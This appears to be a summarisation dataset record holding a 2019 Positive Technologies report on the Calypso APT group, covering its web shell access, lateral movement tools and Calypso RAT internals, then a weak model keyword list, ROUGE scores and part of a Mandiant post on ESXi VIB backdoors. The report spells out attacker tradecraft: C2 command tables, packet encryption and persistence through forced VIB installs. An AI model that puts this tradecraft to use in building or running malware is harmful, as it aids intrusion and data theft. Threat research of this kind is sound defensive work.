indicates that the group has been active since at least September 2016. The primary goal of the group is theft of confidential data. Main targets are governmental institu- tions in Brazil, India, Kazakhstan, Russia, Thailand, and Turkey.Our data gives reason to believe that the APT group is of Asian origin.11.See the section \"Attribution.\"2Initial infection vectorThe attackers accessed the internal network of a compromised organization by using an ASPX web shell. They uploaded the web shell by exploiting a vulnerability or, alternately, guessing default credentials for remote access. We managed to obtain live traffic between the attackers domain tv.teldcomtv.com, the C2 server for the group's trojan. Therefore the hackers use C2 servers not only to control malware, but also to access hosts on compromised infrastructures.The attackers used the web shell to upload utilities1 and malware,2 execute commands, and dis- tribute malware inside the network. Examples of commands from the traffic are demonstrated in the following screenshot.Figure 2. Commands sent to the web shell1.2.See the section \"Lateral movement.\"See the section \"Analyzing Calypso RAT malicious code.\"3Lateral movementThe group performed lateral movement by using the following publicly available utilities and TCP Port Scanner EternalRomanceOn compromised computers, the group stored malware and utilities in either C:\\RECYCLER or C:\\ProgramData. The first option was used only on computers with Windows XP or Windows Server 2003 with NTFS on drive C.The attackers spread within the network either by exploiting vulnerability MS17-010 or by using stolen credentials. In one instance, 13 days after the attackers got inside the network, they used DCSync and Mimikatz to obtain the Kerberos ticket of the domain administrator, \"passing the ticket\" to infect more computers.Figure 3. Obtaining account data via DCSyncUse of such utilities is common for many APT groups. Most of those utilities are legitimate ones used by network administrators. This allows the attackers to stay undetected longer.AttributionIn one attack, the group used Calypso RAT, PlugX, and the Byeby trojan. Calypso RAT is malware unique to the group and will be analyzed in detail in the text that follows.PlugX has traditionally been used by many APT groups of Asian origin. Use of PlugX in itself does not point to any particular group, but is overall consistent with an Asian origin.The Byeby trojan1 was used in the SongXY malware campaign back in 2017. The version used now is modified from the original. The group involved in the original campaign is also of Asian origin. It performed targeted attacks on defense and government-related targets in Russia and the CIS countries. However, we did not find any clear-cut connection between the two campaigns.When we analyzed the traffic between the attackers' server and the web shell, we found that the attackers used a non-anonymous proxy server. The X-Forwarded-For header passed the attackers' in a chain of proxy servers).1.unit42.paloaltonetworks.com/unit42-threat-actors-target-government-belarus-using-cmstar-trojan/4Figure 4. Headers of requests to the web shellThe IP address belongs to China Telecom. We believe the attackers could have been careless and set up the proxy server incorrectly, thus disclosing their real IP address. This is the first piece of evidence supporting the Asian origins of the group.Figure 5. Information on the discovered IP addressThe attackers also left behind a number of system artifacts, plus traces in utility configurations and auxiliary scripts. These are also indicative of the group's origin.For instance, one of the DoublePulsar configuration files contained external IP address addresses.Figure 6. IP address found in the DoublePulsar configurationThis IP address belongs to a Chinese provider, like the one before, and it was most likely left there due to the attackers' carelessness. This constitutes additional evidence of the group's Asian origins.Figure 7. Information on the discovered IP address5We also found BAT scripts that launched ZXPortMap and EarthWorm for port forwarding. Inside PlugX malware we found on the compromised system. As already mentioned, PlugX is tradition- ally used by groups of Asian origin, which constitutes yet more evidence.Therefore we can say that the malware and network infrastructure used all point to the group having an Asian origin.Analyzing Calypso RAT malicious codeThe structure of the malware and the process of installing it on the hosts of a compromised net- work look as follows:Figure 9. Malware structure and installation processDropperThe dropper extracts the payload as an installation BAT script and CAB archive, and saves it to disk. The payload inside the dropper has a magic header that the dropper searches for. The fol- lowing figure shows an example of the payload structure.6Figure 10. Structure of the payload hard-coded in the dropperThe dropper encrypts and decrypts data with a self-developed algorithm that uses CRC32 as a pseudorandom number generator (PRNG). The algorithm performs arithmetic (addition and subtraction) between the generated data and the data that needs to be encrypted or decrypted.Figure 11. Dropper with original encryption and decryption algorithmNow decrypted, the payload is saved to disk at %ALLUSERSPROFILE;\\TMP_%d%d, where the last two numbers are replaced by random numbers returned by the rand() function. Depending on the configuration, the CAB archive contains one of three possibilities: a DLL and encrypted shellcode, a DLL with encoded loader in the resources, or an EXE file. We were unable to detect any instances of the last variant.Installation BAT scriptThe BAT script is encoded by substitution from a preset dictionary of characters; this dictionary is initialized in a variable in the installation script.Figure 12. Example of installation script obfuscationIn the decoded script, we can see comments hinting at the main functions of the script:\u008f \u008fREM Goto temp directory & extract file (go to TEMP directory and extract files there) REM Uninstall old version (uninstall the old version) REM Copy file (copy file) REM Run pre-install script (run the installation BAT script) REM Create service (create a service launching the malware at system startup) REM Create Registry Run (create value in the registry branch for autostart)7At the beginning of each script we can see a set of variables. The script uses these variables to save files, modify services, and modify registry keys.Figure 13. Initializing variables in deobfuscated scriptIn one of the oldest samples, compiled in 2016, we found a script containing comments for how to configure each variable.Figure 14. Early version of the script with comments8Shellcode x86: stagerIn most of the analyzed samples, the dropper was configured to execute shellcode. The dropper saved the DLL and encrypted shellcode to disk. The shellcode name was always identical to that of the DLL, but had the extension .dll.crt. The shellcode is encrypted with the same algorithm as the payload in the dropper. The shellcode acts as a stager providing the interface for communi- cating with C2 and for downloading modules. It can communicate with C2 via TCP and SSL. SSL is implemented via the mbed_tls library.Initial analysis of the shellcode revealed that, in addition to dynamically searching for API func- tions, it runs one more operation that repeats the process of PE file address relocation. The structure of the relocation table is also identical to that found in the PE file.Figure 15. Shellcode relocationsSince the process of shellcode address relocation repeats that of the PE file, we can assume that initially the malware is compiled into a PE file, and then the builder turns it into shellcode. Debugging information found inside the shellcode supports that assumption.Figure 16. Debugging information inside the shellcodeAPI functions are searched for dynamically and addresses are relocated, after which the config- uration hard-coded inside the shellcode is parsed. The configuration contains information about the C2 server address, protocol used, and connection type.Figure 17. Example of shellcode configurationNext the shellcode creates a connection to C2. A random packet header is created and sent to C2. In response the malware receives a network key, saves it, and then uses it every time when com- municating with C2. Then the information about the infected computer is collected and sent to C2.Next three threads are launched. One is a heartbeat sending an empty packet to C2 every 54 seconds. The other processes and executes commands from C2. As for the third thread, we could not figure out its purpose, because the lines implementing its functionality were removed from the code. All we can tell is that this thread was supposed to \"wake up\" every 54 seconds, just like the first one.9ModulesWe have not found any modules so far. But we can understand their functionality by analyzing the code responsible for communication between the shellcode and the modules. Each module is shellcode which is given control over the zero offset of the address. Each module exists in its own separate container. The container is a process with loaded module inside. By default, the process is svchost.exe. When a container is created, it is injected with a small shellcode that caus- es endless sleep. This is also hard-coded in the main shellcode, and more specifically in JustWait. pdb, most likely.The module is placed inside with an ordinary writeprocess and is launched either with NtCreateThreadEx or, on pre-Vista operating systems, CreateRemoteThread.Two pipes are created for each module. One is for transmitting the data from the module to C2; the other for receiving data from C2. Quite likely the modules do not have their own network code and instead use the pipes to communicate with external C2 through the main shellcode.Figure 18. Creating pipes for modulesEach module has a unique ID assigned by C2. Containers are launched in different ways. A con- tainer can be launched in a specific session open in the OS or in the same session as the stager. In any particular session, the container is launched by getting the handle for the session token of a logged-in user, and then launching the process as that user.10Figure 19. Creating container process in a different sessionCommandsThe malware we studied can process 12 commands. All of them involve modules in one way or another. Here is a list of all IDs of commands found in the malware, along with those that the mal- ware itself sends in various situations.IDDirectionTypeDescription0x401From \u04212Command0x402From \u04212CommandCreate module descriptor. This command contains information on the module size and ID. It also allo- cates memory for the module data. The command is likely the first in the chain of commands used for loading a moduleAccept module data, and if all data is accepted, launch the module inside a container running in the same session as the stager0x403From \u04212CommandSame as 0x402, but the module is launched in a container running in a different session0x404From C2CommandWrite data to pipe for module launched inside a con- tainer running in the same session as the stager0x405From \u04212CommandWrite data to pipe for module launched inside a container in a different session0x409From \u04212Command0\u0445201From \u04212CommandGenerate a constant by calling GetTickCount() and save it. This constant is used in the third thread, mentioned already, whose purpose we were unable to discernLaunch the module if the buffer size stored in the module descriptor equals the module size. Does not accept data (unlike commands 0\u0445402 and 0\u0445403). The module is launched inside a container running in the same session as the stager110\u0445202From \u04212CommandSame as 0x201, but the module is launched in a con- tainer running in a different session0\u0445203From \u04212CommandClose all pipes related to a specific module running inside a container launched in the same session as the stager0\u0445204From \u04212CommandSame as 0x203, but for a module running in a con- tainer launched in a different session0x206From \u04212CommandCollect information on sessions open in the system (such as session IDs and computer names) and send it to C20\u0445207From \u04212CommandAssign session ID. This ID will be used to launch con- tainers in this session0x4090x1030x302From the malwareResponseID used in empty heartbeat packets (the first thread described earlier)ResponseID of packet containing information on the infected computerResponseID of packet sent after an accepted session ID is saved (command 0x207)0\u0445304From the malwareResponseID of packet sent after module is successfully placed inside a container. This code is sent after the module is launched in a different session0\u04453030x4060x4070x308From the malwareResponseSame as 0x304, but the module is launched in the same session as the stagerResponseID of packet containing data piped by module in a container launched in the same session as the stagerResponseSimilar to 0x406, but from a module launched in a different sessionResponseID of packet sent if no handle of a logged-in user's session token could be obtained0x408From the malwareResponseID of packet sent if session-related information could not be obtained. Before the packet is sent, the shellcode checks the OS version. If the version is earlier than Vista, data is regarded as impossible to obtain in the manner implemented in the malware, because the Windows API functions it uses are pres- ent only in Vista and later.12Network codeNetwork communication is initialized after the network key is received from C2. To do that, the malware sends a random sequence of 12 bytes to C2. In response the malware also expects 12 bytes, the zero offset of which must contain the same value (_DWORD) as prior to sending. If the check is successful, four bytes at offset 8 are taken from the response and decrypted with RC4. The key is four bytes sent previously, also located at offset 8. This result is the network key. The key is saved and then used to send data.All transmitted packets have the following structure.struct Packet{ _ DWORD key; _ WORD cmdId; _ WORD szPacketPayload; _ DWORD moduleId;_ BYTE [max 0xF000] packetPayload;};A random four-byte key is generated for each packet. It is later used to encrypt part of the header, starting with the cmdld field. The same key is used to encrypt the packet payload. Encryption uses the RC4 algorithm. The key itself is encrypted by XOR with the network key and saved to the corresponding field of the packet header.Shellcode x64: stager (base backdoor)This shellcode is very similar to the previous one, but it deserves a separate description because of differences in its network code and method of launching modules. This shellcode has basic functions for file system interaction which are not available in the shellcode described earlier. Also the configuration format, network code, and network addresses used as C2 by this shellcode are similar to code from a 2018 blog post by NCC Group about a Gh0st RAT variant. However, we did not find a connection to Gh0st RAT.This variant of the shellcode has only one communication channel, via SSL. The shellcode imple- ments it with two legitimate libraries, libeay32.dll and ssleay32.dll, hard-coded in the shellcode itself.First the shellcode performs a dynamic search for API functions and loads SSL libraries. The libraries are not saved to disk; they are read from the shellcode and mapped into memory. Next the malware searches the mapped image for the functions it needs to operate.Then it parses the configuration string, which is also hard-coded in the shellcode. The configura- tion includes information on addresses of C2 servers and schedule for malware operation.Days of the weekFigure 20. Sample of configuration string1.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2018/april/ decoding-network-data-from-a-gh0st-rat-variant/13After that the malware starts its main operating cycle. It checks if the current time matches the malware operational time. If not, the malware sleeps for about 7 minutes and checks again. This happens until the current time is the operational time, and only then does the malware resume operation. Figure 20 demonstrates an example in which the malware remains active at all times on all days of the week.When the operational time comes, the malware goes down the list of C2 servers specified in the configuration and tries to connect. The malware subsequently interacts with whichever of the C2 servers it is able to successfully connect to first.Then the malware sends the information on the infected computer (such as computer name, current date, OS version, 32-bit vs. 64-bit OS and CPU, and IP addresses on network interfaces and their MAC addresses). After the information on the infected computer is sent, the malware expects a response from C2. If C2 returns the relevant code, sending is deemed successful and the malware proceeds. If not, the malware goes back to sequentially checking C2 addresses. Next it starts processing incoming commands from C2.ModulesEach module is a valid MZPE file mapped in the address space of the same process as the shell- code. Also the module can export the GetClassObject symbol, which receives control when run (if required).Each module has its own descriptor created by a command from C2. The C2 server sends a byte array (0x15) describing the module. The array contains information on the module: whether the module needs to be launched via export, module type (in other words, whether it needs pipes for communicating with C2), module size, entry point RVA (used if there is no flag for launching via export), and module data decryption key. The key is, by and large, the data used to format the actual key.Figure 21. Module decryptionWe should also point out that decryption takes place only if modKey is not equal to the 7AC9h constant hard-coded in the shellcode. This check affects only the decryption process. If modKey does equal the constant, the malware will immediately start loading the module. This means the module is not encrypted.14Each module is launched in a separate thread created specially for that purpose. Launching with pipes looks as follows:\u008f\u008f\u008f\u008fThe malware creates a thread for the module, starts mapping the module, and gives it con- trol inside the newly created thread.The malware creates a new connection to the current working C2.The malware creates a pipe with the name derived from the following format string: \\\\.\\ pipe\\windows@#%02XMon (%02X is replaced by a value that is received from \u04212 at the same time as the command for launching the module).The malware launches two threads passing data from the pipe to C2 and vice versa, using the connection created during the previous step. Two more pipes, \\\\.\\pipe\\win- dows@#%02Xfir and \\\\.\\pipe\\windows@#%02Xsec, are created inside the threads. The pipe ending in \"fir\" is used to pass data from the module to C2. The pipe ending in \"sec\" is used to pass data and commands from C2 to the modules.The second thread processing the commands from C2 to the modules has its own handler. This is described in more details in the Commands section. For now we can only say that one of the commands can start a local asynchronous TCP server. That server will accept data from whoever finds available, starting from 5000 and trying possible ports one by one.Commands The following is a list of IDs for commands the malware can receive, along with commands the malware itself sends in various situations.IDDirectionTypeDescription0x294CFrom \u04212CommandCreate module descriptor0x2AC8From \u04212CommandReceive data containing the module, and save it0x230EFrom \u04212CommandLaunch module without creating additional pipes0x2D06From \u04212Command Destroy module descriptor object0x590AFrom \u04212CommandLaunch built-in module for file system access0x3099From \u04212CommandLaunch module and create additional pipes for communication0x1C1CFrom \u04212CommandSelf-removal: run a BAT script removing persistence and clearing the created directories0x55C3From \u04212CommandUpload file from computer to C20x55C5From \u04212CommandList directories recursively150x55C7From \u04212Command Download file from C2 to computer0x3167From \u04212Command Write data to pipe ending in \"Mon\"0x38AFFrom \u04212CommandWrite command 0x38AF to pipe ending in \"Mon\". After that, end the open connection for the module. Possibly means \"complete module operation\"0x3716From \u04212CommandSend module data to a different module0x3A0BFrom \u04212CommandSame as 0x30990x3CD0From \u04212CommandStart an asynchronous TCP server to shuttle data between C2 and connected client0x129EFrom the malwareResponseID of a packet containing information about the computer0x132AFrom \u04212ResponseID of the packet sent by C2 in response to information sent regarding the infected computer. The malware treats receipt of this packet as confirming successful receipt of such information0x155BFrom the malwareResponseID of the packet containing information regarding the initialized module descriptors. The packet acts as \"GetCommand\". Response to this packet contains one of the supported commands0x2873From the malwareResponseID of the packet that is sent if a module descriptor has been initialized successfully (0x294c)0x2D06From the malwareResponseID of the packet that is sent if an error has occurred during module descriptor initialization (0x294c)0x2873From the malwareResponsethe packet that is sent after module data has been received (0x2AC8). Contains the amount of bytes already saved0x2743From the malwareResponseID of the packet that is sent after a module is launched without pipes (0x230E)160x2D06From the malwareResponseID of the packet that is sent after a module descriptor has been destroyed (0x2D06)0x3F15From the malwareResponseID of the packet that is sent after a module is launched with pipes0x32E0From the malwareResponseID of the packet that is sent if there has been an attempt to reinitialize the pipes already created for a module0x34A7From the malwareResponseID of the packet containing the data sent from the pipe to C20x9F37From the malwareResponseID of the packet containing the data forwarded from the TCP server to C2Network codeEach packet has the following structure:Struct Packet{Struct Header{ _ DWORD rand _ k1;_ DWORD rand _ k2; _ DWORD rand _ k3; _ DWORD szPaylaod; _ DWORD protoConst; _ DWORD packetId; _ DWORD unk1; _ DWORD packetKey;};};_ BYTE [max 0x2000] packetPayload;Each packet has a unique key calculated as szPayload + GetTickCount() % hardcodedConst. This key is saved in the corresponding packetKey header field. It is used to generate another key for encrypting the packet header with RC4 (encryption will not occur without the packetKey field). RC4 key generation is demonstrated in the following figure.17Figure 22. Generating RC4 key for the headerThen yet another RC4 key is generated from the encrypted fields szPayload, packetId, proto- Const, and rand_k3. This key is used to encrypt the packet payload.Figure 23. Generating RC4 key for the packet payload18Next the shellcode forms the HTTP headers and the created packet is sent to C2. In addition, each packet gets its own number, indicated in the URL. Modules may pass their ID, which is used to look up the connection established during module launch. Module ID 0 is reserved for the main connection of the stager.Figure 24. Forming HTTP headersOther optionsAs we noted, the dropper may be configured to launch not just shellcode, but executable files too. We found the same dropper-stager but with different payloads: Hussar and FlyingDutchman.Dropper-stagerThe main tasks of this dropper are unpacking and mapping the payload, which is encoded and stored in resources. The dropper also stores encoded configuration data and passes it as a parameter to the payload.Figure 25. Unpacking the payload19HussarIn essence Hussar is similar to the shellcodes described earlier. It allows loading modules and collecting basic information about the computer. It can also add itself to the list of authorized applications in Windows Firewall.InitializationTo start, the malware parses the configuration provided to it by the loader.Figure 26. Configuration sampleConfiguration structure is as follows:Struct RawConfig{ };_ DWORD protocolId; _ BYTE c2Strings [0x100];The protocolId field indicates the protocol to be used for communicating with C2. There are a total of three possibilities:\u008f\u008f\u008fIf protocolId equals 1, a TCP-based protocol will be used.If protocolId equals 2, the protocol will be HTTP-based.If protocolId equals 3, it will be HTTPS-based.The time stamp is calculated from the registry from the key SOFTWARE\\Microsoft\\Windows\\ CurrentVersion\\Telephony (Perf0 value). If reading the time stamp is impossible, \"temp\" is added to the computer identifier.Figure 27. Generating computer ID20Next Hussar creates a window it will use for processing incoming messages.Figure 28. Creating dispatcher windowThen the malware adds itself to the list of authorized applications in Windows Firewall, using the INetFwMgr COM interface.To complete initialization, Hussar creates a thread which connects to C2 and periodically polls for commands. The function running in the thread uses the WSAAsyncSelect API to notify the window that actions can be performed with the created connection (socket is \"ready for reading,\" \"connected,\" or \"closed\").Figure 29. Communication between the open socket and the windowIn general, for transmitting commands, the malware uses the window and Windows messaging mechanism. The window handle is passed to the modules, and the dispatcher has branches not used by the stager, so we can assume that the modules can use the window for communication with C2.21ModulesEach module is an MZPE file loaded into the same address space as the stager. The module must export the GetModuleInfo function, which is called by the stager after image mapping.IdentifierDirectionTypeDescription0x835From \u04212CommandCollect information on the infected comput- er (such as OS version, user name, computer name, and string containing current time and processor name based on registry data, plus whether the OS is 64-bit)0x9CA4From \u04212CommandLoad module. Module data comes from C20xC358 of these???CommandTransmit data from LPARAM to C2???CommandTransmit C2 configuration to the module. Module ID is transmitted to LPARAM???CommandTransmit the received packet to the module. Module ID is sent from C222FlyingDutchmanThe payload provides remote access to the infected computer. It includes functions such as screenshot capture, remote shell, and file system operations. It also allows managing system processes and services. It consists of several modules.Module IDCMD IDDirectionTypeDescription0xafc80xAFD3From \u04212Command Module ping0xAFD4From \u04212CommandSends information about the infected comput- er (such as OS version and installed service packs, processor name, string containing cur- rent time and screen resolution, and informa- tion about free and used disk space)0xAFD5From \u04212CommandSends list of processes running on the system0xAFD7From \u04212CommandEnd process. Process PID is transmitted from C20xAFD9From \u04212CommandSends list of current windows on the system, along with their titles0xAFDAFrom \u04212CommandSend WM_CLOSE message to a specific window0xAFDBFrom \u04212Command Maximize window0xAFDCFrom \u04212Command Minimize window0xAFDDFrom \u04212CommandShow window0xAFDEFrom \u04212CommandHide window230xAFE0From \u04212CommandSends list of current services on the system0xAFE1From \u04212CommandModifies the status of an existing service. Service name is obtained from C2. It can launch a service or change its status to STOP, PAUSE, or CONTINUE. C2 indicates which status to change to0xAFE2From \u04212CommandDelete existing service. Service name is re- ceived from C20xAFE3From \u04212CommandChange service start type. Service name is received from C20xabe00xABEBFrom \u04212Command Module ping0xABECFrom \u04212CommandLaunch the process for transmitting screen- shots from the infected computer. Screenshots are taken every second0xABEDFrom \u04212CommandPause screenshot capture process0xABF1From \u04212CommandStop taking screenshots. The module stops running0xa7f80xA803From \u04212CommandRun cmd.exe plus a thread, which will read console output data from the related pipe and send it to C20xA804From \u04212CommandWrite command to the pipe linked to STDIN of the cmd.exe created previously0xA805From \u04212CommandStop the cmd.exe process and all associated pipes. The module stops running0xa4100xA41BFrom \u04212CommandSends information about system disks and their types240xA41CFrom \u04212CommandSends directory listing. The relevant directory path is obtained via C20xA41EFrom \u04212CommandUpload file from the computer to C20xA41FFrom \u04212CommandRun file0xA420From \u04212Command Delete file0xA421From \u04212Command Download file from C20xA424From \u04212Command Move file0xA425From \u04212CommandCreate directory0xA426From \u04212CommandFile Touch0xA428From \u04212CommandSends the size of a file to C2. File path is passed via C225ConclusionThe group has several successful hacks to its credit, but still makes mistakes allowing us to guess its origins. All data given here suggests that the group originates from Asia and uses malware not previously described by anyone. The Byeby trojan links the group to SongXY, encountered by us Positive TechnologiesPositive Technologies is a leading global provider of enterprise security solutions for vulnerability and compliance manage- ment, incident and threat analysis, and application protection. Commitment to clients and research has earned Positive Tech- nologies a reputation as one of the foremost authorities on Industrial Control System, Banking, Telecom, Web Application, and ERP security, supported by recognition from the analyst community. Learn more about Positive Technologies at ptsecurity.com.ptsecurity.com info@ptsecurity.com\u00a9 2019 Positive Technologies. Positive Technologies and the Positive Technologies logo are trademarks or registered trade- marks of Positive Technologies. All other trademarks mentioned herein are the property of their respective owners.Calypso APT_A4.ENG.0002.02 ", "generated_text": "Palo Alto Networks; the attack; at least September 2016; government institutions; Brazil; India; Kazakhstan; Russia; Thailand; Turkey; the group; lateral movement; Calypso RAT; PlugX; the Byeby trojan; BAT; ZXPortMap; EarthWorm; port forwarding; IP; Chinese; IP address; the attackers; a non-anonymous proxy server; the IP address; China Telecom; information; the IP address; years; the threat actors; Asian origins; lateral movement; the group; a certain group; APT.", "ref_text": "<START-1>The document describes an advanced persistent threat (APT) group named Calypso that has been active since at least September 2016. Calypso targets government institutions in several countries, including Brazil, India, Kazakhstan, Russia, Thailand, and Turkey, with the goal of stealing confidential data. The report provides an analysis of the tactics, techniques, and procedures used by Calypso. The group typically gains initial access by exploiting vulnerabilities or guessing default credentials to upload a web shell. They then use publicly available tools like Mimikatz for lateral movement and credential access. Custom malware like Calypso RAT, PlugX, and a modified Byeby trojan are deployed on compromised hosts for command and control. Detailed analysis is provided on the Calypso RAT malware, including its dropper, installation script, shellcode, commands, modules, and network communication. Variants using different payloads like Hussar and FlyingDutchman are also examined. Evidence suggests the Calypso group originates from Asia, based on IP addresses traced back to China Telecom, artifacts in scripts and configuration files, and the use of PlugX malware associated with Asian APTs. Links to the SongXY group are noted but inconclusive. The report concludes with indicators of compromise and maps Calypso's tactics to the MITRE ATT&CK framework technique IDs. In summary, Calypso is an active, stealthy threat group that continues to target government institutions to steal confidential data using custom malware and tactics. <END-1>", "t5/keyword/hint_hit_precision": 0.42857142857142855, "t5/word/hint_hit_recall": 0.10762331838565023, "gpt3/lexical/rouge_rouge1": 0.4405797101449276, "gpt3/lexical/rouge_rouge2": 0.19825072886297374, "gpt3/lexical/rouge_rougeL": 0.3130434782608696, "gpt3/lexical/rouge_rougeLsum": 0.3130434782608696, "gpt3_generated_text": ["The article discusses an APT group that has been active since at least September 2016 and targets government institutions in Brazil, India, Kazakhstan, Russia, Thailand, and Turkey. The attackers use various malware such as Calypso RAT, PlugX, and the modified Byeby trojan for their operations. They perform lateral movement within compromised networks using utilities like BAT scripts, ZXPortMap, and EarthWorm for port forwarding. Evidence points to the group's Asian origins, including the use of Chinese IP addresses and a non-anonymous proxy server. The group's careless setup of the proxy server revealed their real IP address, further supporting their Asian origins. The group's use of PlugX, system artifacts, and utility configurations also point to their Asian origins."]}, {"split_name": "val", "sample_id": "val_100", "prompt_text": "Extract the keywords: www.mandiant.com /resources/blog/esxi-hypervisors-malware-persistence Bad VIB(E)s Part One: Investigating Novel Malware Persistence Within ESXi HypervisorsAs endpoint detection and response (EDR) solutions improve malware detection efficacy on Windows systems, certain state-sponsored threat actors have shifted to developing and deploying malware on systems that do not generally support EDR such as network appliances, SAN arrays, and VMware ESXi servers.Earlier this year, Mandiant identified a novel malware ecosystem impacting VMware ESXi, Linux vCenter servers, and Windows virtual machines that enables a threat actor to take the following actions:1. Maintain persistent administrative access to the hypervisor 2. Send commands to the hypervisor that will be routed to the guest VM for execution 3. Transfer files between the ESXi hypervisor and guest machines running beneath it 4. Tamper with logging services on the hypervisor 5. Execute arbitrary commands from one guest VM to another guest VM running on the same hypervisorThis malware ecosystem was initially detected during an intrusion investigation when Mandiant identified attacker commands sourced from the legitimate VMware Tools process, vmtoolsd.exe, on a Windows virtual machine hosted on a VMware ESXi hypervisor. Mandiant analyzed the boot profile for the ESXi hypervisors and identified a never-before-seen technique in which a threat actor leveraged malicious vSphere Installation Bundles (\u201cVIBs\u201d) to install multiple backdoors on the ESXi hypervisors. We call these backdoors VIRTUALPITA and VIRTUALPIE (Figure 1).Figure 1: Visualization of ESXi attack pathIt is important to highlight that this is not an external remote code execution vulnerability; the attacker needs admin-level privileges to the ESXi hypervisor before they can deploy malware. Mandiant has no evidence of a zero-day vulnerability being used to gain initial access or deploy the malicious VIBs at the time of writing this post.1/13Details on how to manually detect if malicious or anomalous VIBs are currently installed in your ESXi environment are outlined in our hardening blog post. VMware has released additional information on protecting vSphere. vSphere Installation Bundles (VIB)Mandiant identified two (2) new malware families installed through malicious vSphere Installation Bundles (VIBs), which we have named VIRTUALPITA and VIRTUALPIE.VMware VIBs are collections of files that are designed to facilitate software distribution and virtual system management. Since ESXi utilizes an in-memory filesystem, file edits are not saved across reboots. A VIB package can be used to create startup tasks, custom firewall rules, or deploy custom binaries upon the restart of an ESXi machine. These packages are generally utilized by administrators to deploy updates and maintain systems; however, this attacker was seen leveraging the packages as a persistence mechanism to maintain access across ESXi hypervisors.VIBs can be broken down into three (3) components:An XML descriptor file A \u201cVIB payload\u201d (.vgz archive) A signature file \u2013 A digital signature used to verify the host acceptance level of a VIBThe XML Descriptor File is a config which contains references to the following:The payload to be installed VIB metadata, such as the name and install date The signature file that belongs to the VIBThe VIB payload is a .vgz archive which contains directories and files that will be created on the ESXi machine through the VIB. These files can then be called on to execute on boot when the VIBs are loaded.The signature file is used to verify the host acceptance level of a VIB. The acceptance level is the digital signature system used by VMware to specify what testing has been done by VMware or partners before a VIB is published. Acceptance levels are set for hosts, image profiles, and individual VIBs. The four (4) acceptance levels along with their XML Descriptor short names are listed below:VMWareCertified (certified) CommunitySupported (community)Per VMware documentation, the default minimum acceptance level a VIB needs to be installed on a ESXi host is PartnerSupported. This acceptance level indicates the VIBs are published by a partner that VMware trusts. While this is the default acceptance level, it can be changed manually by an ESXi administrative account. The command used to install VIBs esxcli software vib install does not normally allow installations below the minimum acceptance level, but the --force flag can be used to ignore any systems acceptance level requirements when installing the VIB.The malicious VIBs observed were labelled as PartnerSupported. Mandiant\u2019s review of the Signature Files determined they were empty, and that an attacker modified the XML descriptor file to change the acceptance- level field from community to partner. A CommunitySupported acceptance-level indicates that the VIB2/13was created by a third party which was not reviewed nor signed by VMware or its trusted partners. This indicated the attacker masqueraded these VIB files as PartnerSupported even though they only met the requirements of a CommunitySupported VIB. This also indicated that the VIB was created by an individual or company outside of VMware partner programs and has not gone through any VMware-approved testing program. Figure 2 contains an excerpt of the modified XML descriptor file that was identified.Figure 2: Modified Descriptor XMLWhile the acceptance-level field was modified in the Descriptor XML by the attacker, the ESXi system still did not allow for a falsified VIB file to be installed below the minimal set acceptance level. To circumvent this, the attacker abused the --force flag to install malicious CommunitySupported VIBs.Testing confirmed that modified fields from the XML descriptor file reflected the changes made in the output of commands used to list and verify VIBs. This included the modification of the <acceptance-level> field which tricks the command, esxcli software vib list, into displaying the incorrect acceptance level of the installed VIBs. The VMware command, esxcli software vib signature verify, verifies the signatures of installed VIB packages and displays the following fields:VIB Name The result of the VIB\u2019s signature verificationMandiant confirmed that this command detected when these acceptance levels were falsified, which identified the malicious VIBs. This command displays the acceptance level specified by the XML descriptor file, but the Signature Verification column clarifies if the signature file did not match the respective Descriptor XML. If the signature cannot be verified, the Signature Verification column will contain the value Signature3/13Not Available: Host may have been upgraded from an older ESXi version. An example of this can be seen in Figure 3.Figure 3: Example of falsified VIB acceptance level being seen in esxcli software vib signature verifyVIRTUALPITA (VMware ESXi)VIRTUALPITA is a 64-bit passive backdoor that creates a listener on a hardcoded port number on a VMware ESXi server. The backdoor often utilizes VMware service names and ports to masquerade as a legitimate service. It supports arbitrary command execution, file upload and download, and the ability to start and stop vmsyslogd. During arbitrary command execution, the malware also sets the environmental variable HISTFILE to 0 to further hide activity that occurred on the machine. Variants of this malware were found to listen on a Virtual Machine Communication Interface (VMCI) and log this activity to the file sysclog.VIRTUALPIE (VMware ESXi)VIRTUALPIE is a lightweight backdoor written in Python that spawns a daemonized IPv6 listener on a hardcoded port on a VMware ESXi server. It supports arbitrary command line execution, file transfer capabilities, and reverse shell capabilities. Communications use a custom protocol and are encrypted using RC4.The first malicious VIB named lsu-lsi-lsi-mrarpid-plugin referenced the payload lsu_lsi_.v05 A bash installation script to be placed into /etc/rc.local.d/ to ensure its actions will be executed upon each bootup of ESXi. Uses the esxcli command line utility to enable a firewall rule for backdoor traffic, execute both backdoors, and remove every file created by the VIB from the disk. An ELF backdoor (VIRTUALPITA) that creates a listener on the hard coded TCP port 2233. Capable of arbitrary command execution, file transfer capabilities and the ability to start/stop vmsyslogd. VMWare documentation recorded this port is normally utilized by the vSAN reliable datagram transport (RDT) service on the ESXi version which was reviewed. A lightweight backdoor (VIRTUALPIE) written in Python that spawns a daemonized IPv6 listener the hardcoded port 546. Capable of arbitrary command line execution, file transfer capabilities, and reverse shell capabilities. Communications use a custom protocol and are encrypted using RC4.4/13The second malicious VIB named ata-pata-pdc20211 referenced the payload payload1.v00 (MD5: vmware_rhttpio.sh A bash installation script to be placed into /etc/rc.local.d/ to ensure its actions willDescriptionrhttpproxy-iobe executed upon each bootup of ESXi. This script executes the ELF backdoor An ELF backdoor (VIRTUALPITA) that creates a listener on the hard coded VMCI socket port 18098. Capable of arbitrary command execution, file transfer capabilities and the ability to start/stop vmsyslogd. The following sample generates an additional log not seen in other samples which fetches the systems context ID (CID). The generated log /var/log/sysclog records in the following format [<date/timestamp>]\\n\\r[!]<<PID>>:<CID>:<port>\\n\\nVIRTUALPITA (LINUX)Mandiant discovered two (2) additional VIRTUALPITA samples listening on TCP port 7475 that were persistent as an init.d startup service on Linux vCenter systems. To disguise themselves, the binaries shared the name of the legitimate binary ksmd. KSMD (Kernel Same-Page Merging Daemon) is normally in charge of memory- saving de-duplication on Linux and would not be listening on this port. The samples were found under the start/stop vmsyslogd. VIRTUALGATE (Windows)The Windows guest virtual machines which were hosted by the infected hypervisors also contained a unique malware sample located at C:\\Windows\\Temp\\avp.exe. This malware, which we refer to as VIRTUALGATE, is a utility program written in C that is comprised of two (2) parts, a dropper, and the payload. The memory only dropper deobfuscates a second stage DLL payload that uses VMware's virtual machine communication interface (VMCI) sockets to run commands on a guest virtual machine from a hypervisor host, or between guest virtual machines on the same host. Command Execution through vmtoolsd.exeReviewing the ESXi hypervisors during an active attacker event, 